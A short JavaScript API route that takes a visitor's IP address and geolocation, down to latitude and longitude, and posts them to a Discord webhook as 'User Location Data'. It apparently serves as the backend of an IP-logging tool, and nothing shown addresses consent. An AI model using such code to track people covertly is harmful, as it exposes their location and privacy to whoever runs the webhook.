export async function POST(request) {
  try {
    const body = await request.json();
    const { ip, geolocation, timestamp = new Date().toISOString() } = body;
    
    const webhookURL = process.env.spiderwebb;
    
    if (!webhookURL) {
      throw new Error("Webhook URL not configured");
    }
    
    const fields = [];
    
    fields.push({
      name: "🌐 IP Address",
      value: ip || "Not provided",
      inline: true
    });
    
    if (geolocation) {
      const locationParts = [];
      if (geolocation.city) locationParts.push(geolocation.city);
      if (geolocation.region) locationParts.push(geolocation.region);
      if (geolocation.country) locationParts.push(geolocation.country);
      if (geolocation.latitude && geolocation.longitude) {
        locationParts.push(`📍 ${geolocation.latitude}, ${geolocation.longitude}`);
      }
      if (locationParts.length) {
        fields.push({
          name: "📍 Location",
          value: locationParts.join(", "),
          inline: true
        });
      }
    }
    
    const embed = {
      title: "📍 User Location Data",
      color: 0x5865f2,
      fields: fields,
      footer: {
        text: "Detection Time"
      },
      timestamp: timestamp
    };
    
    const response = await fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ embeds: [embed] }),
    });
    
    if (!response.ok) {
      throw new Error(`Webhook failed with status: ${response.status}`);
    }
    
    return new Response(
      JSON.stringify({ success: true, message: "Data sent to Discord successfully" }),
      {
        status: 200,
        headers: { "Content-Type": "application/json" },
      }
    );
  } catch (error) {
    return new Response(
      JSON.stringify({ success: false, error: error.message }),
      {
        status: 500,
        headers: { "Content-Type": "application/json" },
      }
    );
  }
}